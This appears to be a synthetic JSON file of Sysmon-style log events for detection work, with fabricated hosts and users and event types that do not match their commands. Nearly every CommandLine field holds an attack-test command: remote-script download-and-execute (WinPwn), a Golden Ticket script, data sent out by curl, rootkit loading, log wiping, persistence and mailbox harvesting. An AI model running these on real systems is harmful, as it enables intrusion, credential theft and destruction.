    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-59.simmons.biz",
        "User": "dawn04",
        "ProcessID": 1219,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=organizationalUnit) #{optional_args}\\n\",",
        "LogonID": 515231,
        "LogonGuid": "14313ccb-d2db-48f1-a85a-aad10f166541",
        "SourceProcessID": 7039,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\go..exe",
        "DestinationProcessID": 2408,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\trade..exe",
        "UtcTime": "2024-05-17T01:36:51.678740Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-99.price.com",
        "User": "kwood",
        "ProcessID": 3098,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"wmic #{wmic_command} /FORMAT:\\\"#{local_xsl_file}\\\"\\n\",",
        "LogonID": 272125,
        "LogonGuid": "2afd6dfe-571b-45e4-b2b8-54e686da2309",
        "SourceProcessID": 7318,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\happy..dll",
        "DestinationProcessID": 3676,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\man..exe",
        "UtcTime": "2024-05-17T01:36:51.678740Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-70.williams-austin.com",
        "User": "thompsondean",
        "ProcessID": 9945,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg  add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\\nreg  add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 274603,
        "LogonGuid": "761679fa-027f-4192-b646-624013225a9f",
        "SourceProcessID": 8458,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\together..exe",
        "DestinationProcessID": 9478,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\want..exe",
        "UtcTime": "2024-05-17T01:36:51.678740Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-52.carter-brown.com",
        "User": "aaronstein",
        "ProcessID": 5266,
        "ProcessName": "malware.exe",
        "CommandLine": "\"echo -n 111-11-1111 | b64encode -r -\\ncurl -XPOST #{base64_data}.#{destination_url}\\n\",",
        "LogonID": 600050,
        "LogonGuid": "5c4c3f9f-b53b-47cd-abae-57f8254feefa",
        "SourceProcessID": 8388,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\kitchen..exe",
        "DestinationProcessID": 3741,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\very..dll",
        "UtcTime": "2024-05-17T01:36:51.678740Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-41.irwin.com",
        "User": "mckinneypatrick",
        "ProcessID": 7445,
        "ProcessName": "malware.exe",
        "CommandLine": "\"echo 1> /proc/sys/kernel/sysrq \\necho b> /proc/sysrq-trigger \\n\",",
        "LogonID": 715574,
        "LogonGuid": "c727d95f-0c47-4b5e-8e2b-693ee151802e",
        "SourceProcessID": 4412,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\spring..dll",
        "DestinationProcessID": 7744,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\allow..dll",
        "UtcTime": "2024-05-17T01:36:51.679739Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-76.bean.com",
        "User": "richardterry",
        "ProcessID": 3351,
        "ProcessName": "malware.exe",
        "CommandLine": "\"xwd -root -out #{output_file}\\nxwud -in #{output_file}\\n\",",
        "LogonID": 532727,
        "LogonGuid": "9dfe4eff-2c59-481c-bc59-b6b85bccf38f",
        "SourceProcessID": 2030,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\page..dll",
        "DestinationProcessID": 4594,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\against..exe",
        "UtcTime": "2024-05-17T01:36:51.679739Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-14.smith.com",
        "User": "graykaren",
        "ProcessID": 7926,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\\n\",",
        "LogonID": 431028,
        "LogonGuid": "d53f6a43-efa4-4f45-aa77-853f4d9e229f",
        "SourceProcessID": 7407,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\soon..dll",
        "DestinationProcessID": 5879,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\between..dll",
        "UtcTime": "2024-05-17T01:36:51.679739Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-82.jones.biz",
        "User": "hdavis",
        "ProcessID": 6532,
        "ProcessName": "nc.exe",
        "CommandLine": "\"sudo insmod #{rootkit_path}/#{rootkit_name}.ko\\n\",",
        "LogonID": 699199,
        "LogonGuid": "d8d5095c-73a0-43ac-ab95-4f7057520eeb",
        "SourceProcessID": 5522,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\couple..dll",
        "DestinationProcessID": 5293,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\safe..dll",
        "UtcTime": "2024-05-17T01:36:51.680740Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-22.chambers-parker.com",
        "User": "emmaschmidt",
        "ProcessID": 9479,
        "ProcessName": "nc.exe",
        "CommandLine": "\"schtasks.exe /Change /TN \\\"\\\\Microsoft\\\\Windows\\\\SystemRestore\\\\SR\\\" /disable\\n\",",
        "LogonID": 679968,
        "LogonGuid": "1e3e0761-1ff2-4e22-9e0e-f3298ddb1fb1",
        "SourceProcessID": 5212,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\degree..dll",
        "DestinationProcessID": 5153,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\pressure..exe",
        "UtcTime": "2024-05-17T01:36:51.680740Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-53.cole.com",
        "User": "baldwinwalter",
        "ProcessID": 7545,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Remove-Item $env:TEMP\\\\golden.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\golden.txt -ErrorAction Ignore\\n\\ncmd.exe /c \\\"#{local_folder}\\\\#{local_executable}\\\" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\\\"golden_\\\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\\n\\n# create batch file with commands to run in a separate \\\"runas /netonly\\\" session\\n# so we don't purge Kerberos ticket from the current Windows session\\n# its output goes to golden.txt temp file, because we cannot capture \\\"runas /netonly\\\" output otherwise\\n@\\\"\\n>%TEMP%\\\\golden.txt 2>&1 (\\n  echo Purge existing tickets and create golden ticket:\\n  klist purge\\n  cd %temp%\\n  \\\"#{local_folder}\\\\#{local_executable}\\\" ptt /ticket:kirbifile\\n\\n  echo.\\n  echo Requesting SYSVOL:\\n  dir \\\\\\\\$(#{domaincontroller})\\\\SYSVOL\\n  \\n  echo.\\n  echo Tickets after requesting SYSVOL:\\n  klist\\n\\n  echo.\\n  echo End of Golden Ticket attack\\n)\\n\\\"@ -Replace \\\"kirbifile\\\", $filename | Out-File -Encoding OEM $env:TEMP\\\\golden.bat\\n\\n# run batch file in a new empty session (password and username do not matter)\\necho \\\"foo\\\" | runas /netonly /user:fake \\\"$env:TEMP\\\\golden.bat\\\" | Out-Null\\n\\n# wait until the output file has logged the entire attack\\ndo {\\n  Start-Sleep 1 # wait a bit so the output file has time to be created\\n  Get-Content -Path \\\"$env:TEMP\\\\golden.txt\\\" -Wait | ForEach-Object {\\n    if ($_ -match 'End of Golden Ticket attack') { break } \\n  }\\n} while ($false) # dummy loop so that 'break' can be used\\n\\n# show output from new empty session\\nGet-Content $env:TEMP\\\\golden.txt\\n\\n# cleanup temp files\\nRemove-Item $env:TEMP\\\\golden.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\golden.txt -ErrorAction Ignore\\n\",",
        "LogonID": 950821,
        "LogonGuid": "50409f32-0779-4f2c-be71-f42064986135",
        "SourceProcessID": 3243,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\article..exe",
        "DestinationProcessID": 4898,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\writer..exe",
        "UtcTime": "2024-05-17T01:36:51.680740Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-43.lopez.com",
        "User": "heidi86",
        "ProcessID": 6629,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"cp /bin/sh /tmp/crond;\\necho 'sleep 5' | /tmp/crond\\n\",",
        "LogonID": 557025,
        "LogonGuid": "27619ab2-afa6-4946-86fa-6efc85ef7b96",
        "SourceProcessID": 1431,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\cup..exe",
        "DestinationProcessID": 4504,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\each..dll",
        "UtcTime": "2024-05-17T01:36:51.680740Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-85.brown.com",
        "User": "coopermicheal",
        "ProcessID": 2672,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop\",",
        "LogonID": 980973,
        "LogonGuid": "01ec81a9-b0a2-4ede-90f5-41cc29ad9194",
        "SourceProcessID": 8860,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\within..dll",
        "DestinationProcessID": 5783,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\everything..exe",
        "UtcTime": "2024-05-17T01:36:51.680740Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-08.johnston.com",
        "User": "tarawalton",
        "ProcessID": 2261,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\\\" /v \\\"NoAutoRebootWithLoggedOnUsers\\\" /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 835148,
        "LogonGuid": "36b94b7f-f4cf-4478-9dd1-a9e9dd9f3049",
        "SourceProcessID": 4315,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\structure..exe",
        "DestinationProcessID": 8756,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\left..exe",
        "UtcTime": "2024-05-17T01:36:51.681739Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-00.smith.com",
        "User": "tara55",
        "ProcessID": 7731,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')\",",
        "LogonID": 694492,
        "LogonGuid": "d3c74452-562a-4f66-b4fe-a0e8c23e8248",
        "SourceProcessID": 3087,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\field..exe",
        "DestinationProcessID": 4023,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\government..exe",
        "UtcTime": "2024-05-17T01:36:51.681739Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-61.garrett.com",
        "User": "lisacampbell",
        "ProcessID": 5058,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nspoolvulnscan -noninteractive -consoleoutput\",",
        "LogonID": 302872,
        "LogonGuid": "9fc0cb91-b395-4baf-b17b-b4b24114d360",
        "SourceProcessID": 4046,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\begin..dll",
        "DestinationProcessID": 5847,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\against..dll",
        "UtcTime": "2024-05-17T01:36:51.681739Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-21.gill.com",
        "User": "meredithsummers",
        "ProcessID": 4570,
        "ProcessName": "nc.exe",
        "CommandLine": "\"set file=#{output_file_path}\\\\user_info_%random%.tmp\\necho Username: %USERNAME% > %file%\\necho User Domain: %USERDOMAIN% >> %file%\\nnet users >> %file%\\nquery user >> %file%\\n\",",
        "LogonID": 274317,
        "LogonGuid": "95fa8de2-ffae-4834-a4e4-d3f83ab97a3f",
        "SourceProcessID": 8946,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\drive..exe",
        "DestinationProcessID": 6622,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\player..exe",
        "UtcTime": "2024-05-17T01:36:51.681739Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-97.cooley.org",
        "User": "mpaul",
        "ProcessID": 8950,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$ss = ConvertTo-SecureString \\\"#{password}\\\" -AsPlainText -Force\\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\\n$param = @{\\n    Credential = $cred\\n    Force      = $true\\n}\\n$null = Connect-AzAccount @param\\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\\n$cert = New-SelfSignedCertificate -Subject \\\"CN=PowerShell Application\\\" -CertStoreLocation \\\"Cert:\\\\CurrentUser\\\\My\\\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\\n$reqResourceAccess = ( @{ \\\"resourceAccess\\\" = (@{\\\"id\\\"= \\\"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{\\\"id\\\"= \\\"37f7f235-527c-4136-accd-4a02d197296e\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{\\\"id\\\"= \\\"14dad69e-099b-42c9-810b-d002981feec1\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"e1fe6dd8-ba31-4d61-89e7-88639da4683d\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"810c84a8-4a9e-49e6-bf7d-12d183f40d01\\\"; \\\"type\\\"= \\\"Role\\\"}); \\\"resourceAppId\\\" = \\\"00000003-0000-0000-c000-000000000000\\\" })\\nconnect-mggraph -AccessToken $token\\n$context = Get-MgContext       \\n$users = get-MgUser\\n$app = New-MgApplication -DisplayName \\\"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\\\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\\\"http://localhost\\\"; } -KeyCredentials @(@{ Type=\\\"AsymmetricX509Cert\\\"; Usage=\\\"Verify\\\"; Key=$cert.RawData })\\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\\n$resourceSPN = Get-MgServicePrincipal -Filter \\\"AppId eq '$($app.AppId)'\\\"\\n$graphApiApp = Get-MgServicePrincipal -Filter \\\"DisplayName eq 'Microsoft Graph'\\\"\\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \\\"Mail.Read\\\"\\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\\n$mailbox1 = \\\"#{1st_target_mailbox}\\\"\\n$mailbox2 = \\\"#{2nd_target_mailbox}\\\"\\n$mailbox3 = \\\"#{3rd_target_mailbox}\\\"\\n[System.Collections.ArrayList]$selectUsers = @()\\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\\nforeach ($user in $selectUsers) { $url= \\\"https://graph.microsoft.com/v1.0/users/$($user)/messages\\\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\\n\",",
        "LogonID": 865100,
        "LogonGuid": "66a46122-0d3f-4fa6-afe8-ec0cdacb2d24",
        "SourceProcessID": 4136,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\detail..dll",
        "DestinationProcessID": 6395,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\truth..dll",
        "UtcTime": "2024-05-17T01:36:51.682739Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-06.smith-lewis.org",
        "User": "timothyfernandez",
        "ProcessID": 3886,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nspoolvulnscan -noninteractive -consoleoutput\",",
        "LogonID": 835823,
        "LogonGuid": "a19cf8ca-fb3f-4ad4-b9be-97bd0b64d00d",
        "SourceProcessID": 5789,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\support..exe",
        "DestinationProcessID": 3961,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\fact..dll",
        "UtcTime": "2024-05-17T01:36:51.682739Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-85.lee-green.net",
        "User": "crystalgonzales",
        "ProcessID": 4426,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo smbstatus --shares\\n\",",
        "LogonID": 664915,
        "LogonGuid": "7450ee26-07bf-4857-ab33-06b7ebae9106",
        "SourceProcessID": 1991,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\free..exe",
        "DestinationProcessID": 8316,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\she..dll",
        "UtcTime": "2024-05-17T01:36:51.682739Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-94.cooper-crane.com",
        "User": "cummingstaylor",
        "ProcessID": 6322,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$credFile = \\\"#{cred_file}\\\"\\nif (Test-Path $credFile) {\\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\\n    if($cred.GetNetworkCredential().Password -eq \\\"#{new_password}\\\"){\\n      Write-Host -ForegroundColor Yellow \\\"The new password is the same as the password stored in the credential file. Please specify a different new password.\\\"; exit -1\\n    }\\n    try {\\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\\n    }\\n    catch { \\n        $_.Exception\\n        $errCode = $_.Exception.ErrorCode\\n        Write-Host \\\"Error code: $errCode\\\"\\n        if ($errCode -eq 86) {\\n            Write-Host -ForegroundColor Yellow \\\"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\\\"\\n            Remove-Item $credFile\\n        }\\n        exit $errCode\\n    }\\n    Write-Host -ForegroundColor Cyan \\\"Successfully changed the password to #{new_password}\\\"\\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \\\"#{new_password}\\\" -AsPlainText -Force))\\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\\n}\\nelse {\\n    Write-Host -ForegroundColor Yellow \\\"You must store the password of the current user by running the prerequisite commands first\\\"\\n}\\n\",",
        "LogonID": 438740,
        "LogonGuid": "9c18e78a-2789-459f-ad9b-e0b5474134cc",
        "SourceProcessID": 4013,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\require..dll",
        "DestinationProcessID": 1383,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\class..dll",
        "UtcTime": "2024-05-17T01:36:51.682739Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-82.ray.com",
        "User": "jjohnson",
        "ProcessID": 8066,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"C:\\\\Windows\\\\system32\\\\cmd.exe /c \\\"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\\\"\\n\",",
        "LogonID": 537820,
        "LogonGuid": "2db31cd0-7a94-41a1-bd83-e58eb84df896",
        "SourceProcessID": 8325,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\community..exe",
        "DestinationProcessID": 5625,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\ability..exe",
        "UtcTime": "2024-05-17T01:36:51.683739Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-93.garcia-reyes.info",
        "User": "paulnguyen",
        "ProcessID": 3294,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"dir /s c:\\\\ >> #{output_file}\\ndir /s \\\"c:\\\\Documents and Settings\\\" >> #{output_file}\\ndir /s \\\"c:\\\\Program Files\\\\\\\" >> #{output_file}\\ndir \\\"%systemdrive%\\\\Users\\\\*.*\\\" >> #{output_file}\\ndir \\\"%userprofile%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\*.*\\\" >> #{output_file}\\ndir \\\"%userprofile%\\\\Desktop\\\\*.*\\\" >> #{output_file}\\ntree /F >> #{output_file}\\n\",",
        "LogonID": 325580,
        "LogonGuid": "196f2407-7b50-4ad5-928c-72fc9d39927e",
        "SourceProcessID": 2586,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\century..dll",
        "DestinationProcessID": 2669,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\someone..exe",
        "UtcTime": "2024-05-17T01:36:51.683739Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-87.carter.com",
        "User": "renee56",
        "ProcessID": 7213,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"dir c:\\\\ /b /s .key | findstr /e .key\\n\",",
        "LogonID": 303928,
        "LogonGuid": "a23f8a5e-51bf-4a82-b100-fcd5d6228187",
        "SourceProcessID": 1159,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\perhaps..dll",
        "DestinationProcessID": 1470,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\system..exe",
        "UtcTime": "2024-05-17T01:36:51.683739Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-72.soto.com",
        "User": "alicia06",
        "ProcessID": 9012,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"ENCODED=$(echo '#{message}' | xxd -ps -c 256)\\nprintf $ENCODED | xxd -r -p\\necho $ENCODED | xxd -r -p\\necho $(echo $ENCODED) | xxd -r -p\\necho $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}\\necho $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}\\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p\\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p\\n\",",
        "LogonID": 999465,
        "LogonGuid": "418331ad-9635-4a77-88ea-2c32e04ea1b7",
        "SourceProcessID": 8764,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\hold..dll",
        "DestinationProcessID": 4703,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\today..dll",
        "UtcTime": "2024-05-17T01:36:51.683739Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-83.bishop.biz",
        "User": "joanna19",
        "ProcessID": 7480,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Set-ItemProperty \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\\\\" \\\"Shell\\\" \\\"explorer.exe, #{binary_to_execute}\\\" -Force\\n\",",
        "LogonID": 341046,
        "LogonGuid": "faf18130-8155-4905-8a43-cea958f2c9f9",
        "SourceProcessID": 1274,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\speak..exe",
        "DestinationProcessID": 9157,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\network..dll",
        "UtcTime": "2024-05-17T01:36:51.684740Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-01.fowler.com",
        "User": "rogersjoanna",
        "ProcessID": 1961,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"wmic /node:\\\"#{target_host}\\\" shadowcopy call create Volume=#{drive_letter}\\n\",",
        "LogonID": 957413,
        "LogonGuid": "9002c0de-6166-4804-907f-681adc19c71f",
        "SourceProcessID": 7159,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\certainly..dll",
        "DestinationProcessID": 9414,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\purpose..dll",
        "UtcTime": "2024-05-17T01:36:51.684740Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-98.aguilar.biz",
        "User": "lisa16",
        "ProcessID": 3088,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes\\nsudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)\\n\",",
        "LogonID": 551534,
        "LogonGuid": "1478b021-6c3e-48d6-90fd-94dbab0df1e4",
        "SourceProcessID": 6309,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\rich..exe",
        "DestinationProcessID": 5959,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\effect..exe",
        "UtcTime": "2024-05-17T01:36:51.684740Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-44.frey.info",
        "User": "rfitzgerald",
        "ProcessID": 1868,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\build\\\\namedpipes_executor.exe\\\" --pipe 3\\n\",",
        "LogonID": 585199,
        "LogonGuid": "6a8fca58-f099-47c0-ae52-0d49c1d8598f",
        "SourceProcessID": 9307,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\card..exe",
        "DestinationProcessID": 1311,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\age..dll",
        "UtcTime": "2024-05-17T01:36:51.684740Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-04.baker.com",
        "User": "jessica19",
        "ProcessID": 7390,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}\",",
        "LogonID": 532623,
        "LogonGuid": "f184ffed-872d-4e68-aa3b-f8f000f77a6a",
        "SourceProcessID": 4274,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\theory..exe",
        "DestinationProcessID": 9141,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\box..dll",
        "UtcTime": "2024-05-17T01:36:51.684740Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-94.mcclure.biz",
        "User": "zball",
        "ProcessID": 8605,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Invoke-Expression \\\"#{input_file}\\\"\\n\",",
        "LogonID": 999994,
        "LogonGuid": "3ccfa563-9f1f-4a73-8618-001248b8bc7f",
        "SourceProcessID": 2374,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\may..exe",
        "DestinationProcessID": 7604,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\own..dll",
        "UtcTime": "2024-05-17T01:36:51.684740Z"
    },
    {
        "EventID": 11,
